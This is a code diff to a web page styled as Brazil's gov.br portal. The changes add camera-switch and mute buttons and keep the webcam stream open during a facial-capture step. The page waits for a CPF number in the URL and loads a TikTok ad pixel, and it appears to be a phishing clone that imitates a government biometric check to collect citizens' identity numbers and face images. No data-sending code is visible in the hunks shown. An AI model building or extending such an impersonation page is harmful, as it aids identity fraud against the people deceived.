@@ -217,12 +217,51 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     .gov-pill.err  { background: #e53935; }
     .gov-pill.ok   { background: #2e7d32; }
 
-    /* CARD CÂMERA */
+    /* ÍCONES INFERIORES — câmera e som */
+    .bottom-icons {
+      display: none;
+      position: fixed;
+      bottom: 80px; /* acima do footer */
+      right: 24px;
+      align-items: flex-end;
+      gap: 28px;
+      z-index: 1001;
+    }
+    .bottom-icons.show { display: flex; }
+    .bottom-icon {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 5px;
+      cursor: pointer;
+      background: none;
+      border: none;
+    }
+    .bottom-icon .icon-circle {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      background: #f0f4ff;
+      border: 1.5px solid #dce8ff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 8px rgba(0,0,0,.12);
+    }
+    .bottom-icon .icon-circle i {
+      font-size: 22px;
+      color: #1351B4;
+    }
+    .bottom-icon span {
+      font-size: 11px;
+      color: #1351B4;
+      font-weight: 500;
+    }
+    .bottom-icon.muted .icon-circle i { color: #90a4ae; }
+    .bottom-icon.muted span { color: #90a4ae; }
+
+    /* CARD CÂMERA — sem box, oval direto na página */
     .cam-card {
-      background: #fff;
-      border-radius: 16px;
-      box-shadow: 0 1px 8px rgba(0,0,0,.13);
-      padding: 28px 0 24px;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -335,7 +374,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
   <div id="loading-screen">
     <img src="images/govbr.png" style="width: 140px; margin: 10px;">
-    <p id="loading-msg">Verificando seus dados...</p>
   </div>
 
   <header>
@@ -408,6 +446,22 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
   </main>
 
+  <!-- ícones inferiores direitos — câmera e som -->
+  <div class="bottom-icons" id="bottom-icons">
+    <div class="bottom-icon" id="icon-camera" title="Trocar câmera">
+      <div class="icon-circle">
+        <img src="refresh_1829450.png" style="width:24px;height:24px;filter:invert(19%) sepia(90%) saturate(1200%) hue-rotate(200deg) brightness(90%) contrast(95%);">
+      </div>
+      <span>Câmera</span>
+    </div>
+    <div class="bottom-icon" id="icon-som" title="Silenciar">
+      <div class="icon-circle">
+        <img id="img-som" src="icon-som.png" style="width:26px;height:26px;">
+      </div>
+      <span>Som</span>
+    </div>
+  </div>
+
   <footer>Termos de Uso e Aviso de Privacidade
     <p style="margin-top:8px;font-size:13px;">
       <a href="termos-uso.html" style="color:var(--gov-blue-primary);text-decoration:none;margin-right:12px;">Termos de Uso</a>
@@ -429,7 +483,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
     const $         = id => document.getElementById(id);
     const elLoading = $('loading-screen');
-    const elLoadMsg = $('loading-msg');
     const elMain    = $('main-content');
     const elPill    = $('gov-pill');
     const elOval    = $('oval-wrap');
@@ -441,6 +494,39 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
     let userData = null;
     let stream   = null;
+
+    const elBottomIcons = $('bottom-icons');
+    const elIconCamera  = $('icon-camera');
+    const elIconSom     = $('icon-som');
+
+    let somMutado  = false;
+    let facingMode = 'user';
+
+    // ── Trocar câmera (frontal ↔ traseira) ──
+    elIconCamera.addEventListener('click', async () => {
+      if (!stream) return;
+      facingMode = facingMode === 'user' ? 'environment' : 'user';
+      stream.getTracks().forEach(t => t.stop());
+      stream = null;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+          audio: false
+        });
+        elVideo.srcObject = stream;
+      } catch (e) { console.error(e); }
+    });
+
+    // ── Mutar / desmutar som ──
+    elIconSom.addEventListener('click', () => {
+      somMutado = !somMutado;
+      if (somMutado) {
+        elIconSom.classList.add('muted');
+        silenciar();
+      } else {
+        elIconSom.classList.remove('muted');
+      }
+    });
 
     // ── Pill ──
     function pill(txt, cls) {
@@ -528,23 +614,36 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
     // ── Câmera ──
     async function abrirCamera() {
+      // se já tem stream ativo, só reconecta o vídeo sem pedir permissão de novo
+      if (stream && stream.active) {
+        elVideo.srcObject     = stream;
+        elVideo.style.display = 'block';
+        elPh.style.display    = 'none';
+        elBottomIcons.classList.add('show');
+        return;
+      }
       try {
         stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+          video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
           audio: false
         });
         elVideo.srcObject     = stream;
         elVideo.style.display = 'block';
         elPh.style.display    = 'none';
+        elBottomIcons.classList.add('show');
       } catch (e) {
-        // sem permissão — fluxo visual continua
         elVideo.style.display = 'none';
       }
+    }
+
+    function esconderVideo() {
+      elVideo.style.display = 'none';
     }
 
     function fecharCamera() {
       if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
       elVideo.style.display = 'none';
+      elBottomIcons.classList.remove('show');
     }
 
     function resetVisual() {
@@ -598,7 +697,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
       /* reset */
       elErr.classList.remove('show');
-      fecharCamera();
+      esconderVideo();          /* mantém stream ativo, só esconde */
       resetVisual();
       hidePill();
       elPh.style.display = 'flex';
@@ -636,7 +735,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
       /* CPF obrigatório — fica na tela de loading sem ele */
       if (!cpf || cpf.replace(/\D/g, '').length < 11) {
-        elLoadMsg.textContent = 'Aguardando dados de acesso...';
         const check = setInterval(() => {
           const c = new URLSearchParams(window.location.search).get('cpf');
           if (c && c.replace(/\D/g, '').length === 11) {
@@ -648,8 +746,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       }
 
       try {
-        elLoadMsg.textContent = 'Verificando seus dados...';
-        const cleanCPF   = cpf.replace(/\D/g, '');
+      const cleanCPF   = cpf.replace(/\D/g, '');
         const controller = new AbortController();
         const t          = setTimeout(() => controller.abort(), 10000);
 
